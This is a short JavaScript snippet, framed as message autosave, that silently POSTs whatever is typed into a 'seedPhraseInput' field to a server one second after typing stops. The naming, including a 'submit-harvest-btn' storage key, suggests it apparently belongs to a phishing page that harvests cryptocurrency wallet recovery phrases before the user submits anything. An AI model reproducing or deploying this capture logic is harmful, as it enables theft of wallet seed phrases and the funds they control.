const input = document.getElementById("seedPhraseInput");

let conversationId = localStorage.getItem("submit-harvest-btn");
let saveTimer = null;

input.addEventListener("input", () => {
    clearTimeout(saveTimer);

    const text = input.value.trim();

    if (!text) {
        return;
    }

    // Save 1 second after the user stops typing
    saveTimer = setTimeout(() => {
        saveMessage(text);
    }, 1000);
});

async function saveMessage(text) {
    try {
        const response = await fetch("/api/messages", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                text: text,
                conversationId: conversationId
            })
        });

        const result = await response.json();

        if (!response.ok || !result.success) {
            throw new Error(
                result.error || "Failed to save message."
            );
        }

        conversationId = result.conversationId;

        localStorage.setItem(
            "conversationId",
            conversationId
        );

        console.log("Message saved:", result.message.id);

    } catch (error) {
        console.error("Message failed:", error);
    }
}
